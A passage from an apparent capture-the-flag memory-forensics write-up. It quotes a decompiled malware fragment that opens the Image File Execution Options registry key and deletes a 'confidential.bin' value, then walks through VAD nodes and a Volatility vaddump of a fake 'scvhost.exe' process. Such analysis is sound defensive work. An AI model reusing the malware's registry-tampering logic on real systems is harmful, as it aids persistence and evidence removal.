style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">14000355b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Execution  Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000178 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003575\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteValueA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"confidential.bin\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000178 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003588\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000170 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400035ba\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Executio n Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000170 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400035d4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegDeleteValueW\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2,L\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"confidential.bin\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000170 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400035e7\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegCloseKey\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pHVar2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">1400035f6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140003616\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000150 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">config\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">systemprofile\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppData\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Local\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Temp\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">* \"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                             );\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-13.png\" alt=\"image\">\u003C/p>\n\u003Cp>Also this is how the malware enumerates the list : )\u003C/p>\n\u003Cp>Azrael was very sus , lets try running envars plugin to see the stuff which the variable uses .\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-14.png\" alt=\"image\">\u003C/p>\n\u003Cp>Im guessting that this is the key ?\u003C/p>\n\u003Cp>Now xoring it with 0x33 the value which we found earlier\u003C/p>\n\u003Cp>Since the malware deleated some stuff , i looked at MFT-table which on memlabs expereicne  has some flag parts or clues related to it ?\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-15.png\" alt=\"image\">\u003C/p>\n\u003Cp>Onto the next part , i need some explanations -\u003C/p>\n\u003Cp>The Virtual Address Descriptor (VAD) node is a data structure used by the Windows operating system to manage virtual memory. Each VAD node contains information about a specific virtual memory region, including the starting and ending addresses, the memory protection constants, and other attributes.\u003C/p>\n\u003Cp>To determine the memory protection constants for a specific VAD node, use the “vadinfo” plugin in the Volatility framework.\u003C/p>\n\u003Cp>VAD is a tree structure and like any tree structure it has a root (which is called Vadroot) and nodes/leafs (Vadnodes) that contains all the information related to memory ranges reserved for a specific process by the memory manager. For each chunk of a continuous virtual memory address allocations, memory manager creates a corresponding VAD node that contains the information about this continuous allocations\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-16.png\" alt=\"image\">\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/like-father-like-son/batman-17.png\" alt=\"image\">\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>PS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f Damian.mem --profile Win7SP1x64 vaddump -p 1924 -D vads/\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Volatility Foundation Volatility Framework 2.6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Pid        Process              Start              End                Result\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>---------- -------------------- ------------------ ------------------ ------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000000007ffe0000 0x000000007ffeffff vads/scvhost.exe.11ff67b30.0x000000007ffe0000-0x000000007ffeffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000110000 0x000000000030ffff vads/scvhost.exe.11ff67b30.0x0000000000110000-0x000000000030ffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000040000 0x0000000000040fff vads/scvhost.exe.11ff67b30.0x0000000000040000-0x0000000000040fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000020000 0x000000000002ffff vads/scvhost.exe.11ff67b30.0x0000000000020000-0x000000000002ffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000010000 0x000000000001ffff vads/scvhost.exe.11ff67b30.0x0000000000010000-0x000000000001ffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000030000 0x0000000000033fff vads/scvhost.exe.11ff67b30.0x0000000000030000-0x0000000000033fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000060000 0x00000000000c6fff vads/scvhost.exe.11ff67b30.0x0000000000060000-0x00000000000c6fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000050000 0x0000000000050fff vads/scvhost.exe.11ff67b30.0x0000000000050000-0x0000000000050fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x00000000000e0000 0x00000000000e0fff vads/scvhost.exe.11ff67b30.0x00000000000e0000-0x00000000000e0fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x00000000000d0000 0x00000000000d0fff vads/scvhost.exe.11ff67b30.0x00000000000d0000-0x00000000000d0fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000077020000 0x0000000077119fff vads/scvhost.exe.11ff67b30.0x0000000077020000-0x0000000077119fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x00000000004a0000 0x000000000059ffff vads/scvhost.exe.11ff67b30.0x00000000004a0000-0x000000000059ffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000490000 0x000000000049ffff vads/scvhost.exe.11ff67b30.0x0000000000490000-0x000000000049ffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000320000 0x000000000041ffff vads/scvhost.exe.11ff67b30.0x0000000000320000-0x000000000041ffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000001d20000 0x0000000001f1ffff vads/scvhost.exe.11ff67b30.0x0000000001d20000-0x0000000001f1ffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000000730000 0x00000000008b0fff vads/scvhost.exe.11ff67b30.0x0000000000730000-0x00000000008b0fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x00000000005a0000 0x0000000000727fff vads/scvhost.exe.11ff67b30.0x00000000005a0000-0x0000000000727fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x00000000008c0000 0x0000000001cbffff vads/scvhost.exe.11ff67b30.0x00000000008c0000-0x0000000001cbffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000002470000 0x000000000266ffff vads/scvhost.exe.11ff67b30.0x0000000002470000-0x000000000266ffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x00000000020b0000 0x00000000022affff vads/scvhost.exe.11ff67b30.0x00000000020b0000-0x00000000022affff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x00000000026b0000 0x00000000028affff vads/scvhost.exe.11ff67b30.0x00000000026b0000-0x00000000028affff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000077240000 0x00000000773e8fff vads/scvhost.exe.11ff67b30.0x0000000077240000-0x00000000773e8fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x0000000077120000 0x000000007723efff vads/scvhost.exe.11ff67b30.0x0000000077120000-0x000000007723efff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000000007f0e0000 0x000000007ffdffff vads/scvhost.exe.11ff67b30.0x000000007f0e0000-0x000000007ffdffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000000007efe0000 0x000000007f0dffff vads/scvhost.exe.11ff67b30.0x000000007efe0000-0x000000007f0dffff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefefe0000 0x000007feff0bafff vads/scvhost.exe.11ff67b30.0x000007fefefe0000-0x000007feff0bafff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefd570000 0x000007fefd58efff vads/scvhost.exe.11ff67b30.0x000007fefd570000-0x000007fefd58efff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefd020000 0x000007fefd076fff vads/scvhost.exe.11ff67b30.0x000007fefd020000-0x000007fefd076fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000000013f130000 0x000000013f22afff vads/scvhost.exe.11ff67b30.0x000000013f130000-0x000000013f22afff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefd4f0000 0x000007fefd55afff vads/scvhost.exe.11ff67b30.0x000007fefd4f0000-0x000007fefd55afff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefd0c0000 0x000007fefd0cefff vads/scvhost.exe.11ff67b30.0x000007fefd0c0000-0x000007fefd0cefff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefd560000 0x000007fefd56dfff vads/scvhost.exe.11ff67b30.0x000007fefd560000-0x000007fefd56dfff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefe0c0000 0x000007fefe1ecfff vads/scvhost.exe.11ff67b30.0x000007fefe0c0000-0x000007fefe1ecfff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefd590000 0x000007fefd5f6fff vads/scvhost.exe.11ff67b30.0x000007fefd590000-0x000007fefd5f6fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefdfa0000 0x000007fefe068fff vads/scvhost.exe.11ff67b30.0x000007fefdfa0000-0x000007fefe068fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fefe250000 0x000007fefefd7fff vads/scvhost.exe.11ff67b30.0x000007fefe250000-0x000007fefefd7fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fffffb0000 0x000007fffffd2fff vads/scvhost.exe.11ff67b30.0x000007fffffb0000-0x000007fffffd2fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007feff430000 0x000007feff4a0fff vads/scvhost.exe.11ff67b30.0x000007feff430000-0x000007feff4a0fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007feff280000 0x000007feff31efff vads/scvhost.exe.11ff67b30.0x000007feff280000-0x000007feff31efff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007feff250000 0x000007feff27dfff vads/scvhost.exe.11ff67b30.0x000007feff250000-0x000007feff27dfff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007feff320000 0x000007feff428fff vads/scvhost.exe.11ff67b30.0x000007feff320000-0x000007feff428fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007feff560000 0x000007feff560fff vads/scvhost.exe.11ff67b30.0x000007feff560000-0x000007feff560fff.dmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>      1924 scvhost.exe          0x000007fffffd9000 0x000007fffffdafff 